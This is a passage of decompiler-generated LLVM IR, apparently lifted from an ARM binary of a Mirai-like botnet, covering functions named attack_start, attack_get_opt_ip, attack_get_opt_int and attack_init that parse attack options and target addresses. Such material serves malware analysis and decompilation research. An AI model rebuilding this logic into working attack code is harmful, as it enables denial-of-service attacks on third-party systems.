  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_223f0.30 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_223f4.32 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_223f1.39 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_223f4.32, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_223f1.39 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.41 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_223f1.39 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_223f4.32, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.41 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
